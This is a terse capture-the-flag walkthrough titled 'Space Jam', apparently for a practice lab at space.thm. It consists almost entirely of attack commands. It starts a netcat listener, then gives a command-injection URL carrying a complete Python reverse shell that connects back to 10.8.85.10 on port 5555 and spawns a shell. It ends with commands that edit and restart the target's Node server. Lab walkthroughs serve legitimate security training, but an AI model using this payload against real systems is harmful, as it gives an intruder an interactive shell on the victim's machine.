# Space Jam
1. `nc -nvlp 5555`
2. http://space.thm/?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.85.10",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
3. `vim /home/bunny/simple-command-injection/server.js` and change app.listen port
4. `netstat -nlp | grep 3000`
5. `ps -p <PROCESS ID>`
5. `node server.js`
